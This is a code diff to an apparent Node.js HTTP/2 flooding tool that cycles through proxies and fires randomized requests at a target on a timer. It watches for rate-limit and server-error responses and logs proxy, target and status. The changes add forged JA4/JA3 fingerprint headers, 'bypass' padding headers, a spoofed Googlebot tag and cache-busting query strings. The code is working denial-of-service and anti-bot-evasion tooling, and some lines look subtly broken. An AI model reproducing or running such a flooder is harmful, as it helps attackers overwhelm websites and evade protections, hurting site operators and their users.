@@ -11,7 +11,7 @@ const os = require("os");
 const v8 = require('v8');
 const errorHandler = error => {
     
-    // console.log(error);
+    console.log(error);
     
 };
 process.on("uncaughtException", errorHandler);
@@ -90,35 +90,8 @@ const headerFunc = {
         return sigalgs[Math.floor(Math.random() * sigalgs.length)];
     },
 }
-const secureOptions =
-    crypto.constants.SSL_OP_NO_SSLv2 |
-    crypto.constants.SSL_OP_NO_SSLv3 |
-    crypto.constants.SSL_OP_NO_TLSv1 |
-    crypto.constants.SSL_OP_NO_TLSv1_1 |
-    crypto.constants.ALPN_ENABLED |
-    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
-    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
-    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
-    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
-    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
-    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
-    crypto.constants.SSL_OP_SINGLE_DH_USE |
-    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
-    crypto.constants.SSL_OP_NO_RENEGOTIATION |
-    crypto.constants.SSL_OP_NO_TICKET |
-    crypto.constants.SSL_OP_NO_COMPRESSION |
-    crypto.constants.SSL_OP_NO_RENEGOTIATION |
-    crypto.constants.SSL_OP_TLSEXT_PADDING |
-    crypto.constants.SSL_OP_ALL |
-    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
-const secureContextOptions = {
-    ciphers: cipher,
-    sigalgs: headerFunc.sigalgs(),
-    honorCipherOrder: true,
-    secureOptions: secureOptions,
-    secureProtocol: ['TLSv1_3_method']
-};
-const secureContext = tls.createSecureContext(secureContextOptions);
+
+
 process.on('uncaughtException', function(e) {
     if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
 }).on('unhandledRejection', function(e) {
@@ -520,7 +493,7 @@ const architectures = {
 function getRandomInt(min, max) {
   return Math.floor(Math.random() * (max - min + 1)) + min;
 }
-const a = getRandomInt(130,135);
+const a = getRandomInt(134,135);
 var browsers = [
  `Safari/537.36 Safari/${a}`,
   `Safari/537.36`,
@@ -534,9 +507,25 @@ function getRandomValue(arr) {
 const randomOS = getRandomValue(operatingSystems);
 const randomArch = architectures[randomOS]; 
 const randomBrowser = getRandomValue(browsers);
+const generateUserAgent = () => {
+    const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
+    const browserNames = Array.from({ length: 100 }, (_, i) => `Dynamic${i + 1}`);
+    const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
+    const operatingSystems = ["Safari", "Tiger", "Bot", "Top", "Seo"];
+    const deviceNames = Array.from({ length: 80 }, (_, i) => `Names${i + 1}`);
+    const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
+    const engineVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
+    const customFeatures = Array.from({ length: 50 }, (_, i) => `Bypass${i + 1}`);
+    const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
 
-const uas =  `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a} ${randomBrowser}`;
-const memayngu = `${randomBrowser}/${randomBrowser}/${randomArch}`;
+    return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} ` +
+        `(${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ` +
+        `${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} ` +
+        `(KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
+};
+const uas =  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36";
+//`Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a} ${randomBrowser}`
+const memayngu = `${mmb}`;
     const platforms = {
         chrome: `${memayngu}`,
         safari: `${memayngu}`,
@@ -738,26 +727,74 @@ const test = generateRandomString(2,5);
 					return shuffledObject;
 				  }
     
+function generateJA4TCP(socket) {
+    const ttl = 64; // giả định TTL mặc định
+    const df =  Math.random < 0.5 ? 1 : 0;
+    const mss = 1460; // phổ biến
+    const tcpOptions = '1'; // giả định TCP option "SACK Permitted"
+    return `${ttl},${df},${tcpOptions},${mss}`;
+}
+function random_int(minimum, maximum) {
+    return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
+}
+function generateJA4LFingerprint(options) {
+    const version = '772'; // TLS 1.2 = 771, TLS 1.3 = 772 (tuỳ chọn nếu cần dynamic)
+const cipher_suites = ['4865', '4866', '4867', '49195', '49195', '49199', '49196', '49200', '52393', '52392', '49171', '49172', '156', '157', '47', '53'];
+    const ciphers = cipher_suites[random_int(0, cipher_suites.length - 1)];
+    const sigalgs = sigals;
+    const extensions = ['0', '11', '10', '35', '13', '5', '18', '23', '65281'];
+    const curves = ['29', '23', '24'];
+    const pointFormats = ['0'];
+    const fingerprintString = `${version},${ciphers},${extensions.join('-')},${curves.join('-')},${pointFormats.join('-')}`;
+    const hash = crypto.createHash('sha256').update(fingerprintString).digest('hex');
+    return hash;
+}
+
+const ja4tcp = generateJA4TCP();
+const ja4l = generateJA4LFingerprint();
+//console.log(`[JA4 TCP] ${ja4tcp}`);
+//console.log(`[JA4L TLS] ${ja4l}`.cyan);
+const heada = {}
+    heada["x-ua-tag"] = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
+    heada["x-ja4-tag"] = ja4l;
+    heada["x-ja4-tcp"] = ja4tcp;
+    heada[`x-header-ja3`] = '0110xXXx'.repeat(100);
+    heada["x-custom-bypass"] = 'bypass'.repeat(111);
+
+
+//console.log(heada)
 
     const TLSOPTION = {
          ciphers: cipher,
-		  secureProtocol:['TLSv1_3_method'], 
+	//	 secureProtocol:['TLSv1_3_method'], 
 		   echdCurve: "X25519",
-        // sigalgs: sigals,
-      //  minVersion: "TLSv1.3",
+        sigalgs: sigals,
+       minVersion: "TLSv1.3",
         
       //  maxVersion: "TLSv1.3",
         secure: true,
-        requestOCSP: true,
+     //   requestOCSP: true,
                      
         rejectUnauthorized: false,
         ALPNProtocols: ['h2'],
-            
-            
+          fingerprint: generateJA4LFingerprint({ciphers: cipher,
+	//	 secureProtocol:['TLSv1_3_method'], 
+		   echdCurve: "X25519",
+        sigalgs: sigals,
+       minVersion: "TLSv1.3",
+        
+      //  maxVersion: "TLSv1.3",
+        secure: true,
+     //   requestOCSP: true,
+                     
+        rejectUnauthorized: false,
+        ALPNProtocols: ['h2']})
             
 
                     
     };
+
+
     async function createCustomTLSSocket(parsed, socket) {
         const tlsSocket = await tls.connect({
             ...TLSOPTION,
@@ -770,7 +807,10 @@ const test = generateRandomString(2,5);
         return tlsSocket;
     }
 
-                    
+
+
+
+
     const closeConnections = (client, connection,tlsSocket, socket, threaf) => {
         if (client) client.destroy();
         if (socket) socket.end();
@@ -843,7 +883,7 @@ const test = generateRandomString(2,5);
                 
                 closeConnections();
             });
-    
+    var chead ={}
             client.on("connect", async () => {
     
                 threaf = setInterval(async () => {
@@ -854,11 +894,13 @@ const test = generateRandomString(2,5);
                             ":authority": parsed.host,
                             ":scheme": "https",
                             ":path": query === 'true' ?
-                                path + 'page=' + generateRandomString(3, 15) + '?q=' + generateRandomString(3, 15) :
+                                path + '?search=' + generateRandomString(3, 15) + '__' + generateRandomString(3, 15) :
                                 query === 'query' ?
-                                path + '?q=' + generateRandomString(3, 15) :
+                                path + '?search=' + generateRandomString(3, 15) :
                                 path,
                          ...headers,
+...heada,
+...chead,
                         };
 let HeadersResponse = shuffleObject({
                     ...taoDoiTuongNgauNhien(),
@@ -868,10 +910,12 @@ let HeadersResponse = shuffleObject({
 
 //   console.log(author)
                         const head = header;
-//console.log({...head,...author})
+//console.log({...head,...author,...HeadersResponse})
                         const request = await client.request({...head,...author});
     
-                        
+                        const sentKB = client.socket.bytesWritten;
+  
+  
                                 request.on('response', (res) => {
 
 let statuses
@@ -887,10 +931,10 @@ statuses = "Timeout".red;
 statuses = "HTTP/2 not found".blue;
 }
 if (process.argv.includes('--debug')) {
-console.log(`[${'WORKER'.bold.magenta}].  |. ${('Proxy').bold.red}: ${(proxy[0]).bold.italic.green}.  |. ${('Target').bold.red}:${(target).bold.italic.green}. |. ${('Status').bold.red}: ${statuses}`);
+console.log(`[${'WORKER'.bold.magenta}].  |. ${('Proxy').bold.red}: ${(proxy[0]).bold.italic.green}.  |. ${('Target').bold.red}:${(target).bold.italic.green}. |. ${('Status').bold.red}: ${statuses}. |. ${('Data/rq').bold.red}: ${sentKB.toFixed(2).bold.italic.green} KB`);
   }          
                                     
-   
+   //. |. ${('User-Agent').bold.red}:${(uas).bold.italic.green}
 //console.log(res[":status"])
                                  if (ratelimit0 === true && res[":status"] === 429) {
                                         maprate.push({ proxy: proxy, timestamp: Date.now() });
@@ -901,7 +945,7 @@ console.log(`[${'WORKER'.bold.magenta}].  |. ${('Proxy').bold.red}: ${(proxy[0])
                            
                                     if (res[":status"] >= 500) {
                                         maprate.push({ proxy: proxy, timestamp: Date.now() });
-                                        rps = 3 * rps;
+                                        rps = (rps / rps)*thread;
                                         client.close();
                                         return;
                                     }
@@ -910,6 +954,7 @@ console.log(`[${'WORKER'.bold.magenta}].  |. ${('Proxy').bold.red}: ${(proxy[0])
                                      maprate.push({ proxy: proxy, timestamp: Date.now() });
                                         return;
                                     }
+
                                     if (res["set-cookie"]) {
                                         chead["cookie"] = res["set-cookie"].join("; ");
                                     }
@@ -920,6 +965,8 @@ console.log(`[${'WORKER'.bold.magenta}].  |. ${('Proxy').bold.red}: ${(proxy[0])
                                     }
                                 }).end();
 
+  
+  
                         request.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                     }
                 }, interval);
